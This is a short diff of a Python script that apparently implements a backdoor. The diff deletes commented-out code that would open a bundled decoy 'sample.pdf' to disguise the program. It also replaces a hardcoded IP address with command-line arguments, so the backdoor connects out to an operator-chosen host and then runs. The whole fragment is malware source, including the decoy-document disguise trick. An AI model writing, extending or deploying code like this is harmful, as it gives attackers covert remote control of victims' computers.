@@ -221,10 +221,8 @@ class Backdoor:
 
 
 try:
-    #front = sys._MEIPASS + "\\sample.pdf"
-    #subprocess.Popen(front,shell=True)
     args = Args()
-    backdoor = Backdoor("192.168.241.133",args.port)
+    backdoor = Backdoor(args.ip,args.port)
     backdoor.run()
 except KeyboardInterrupt:
     sys.exit()
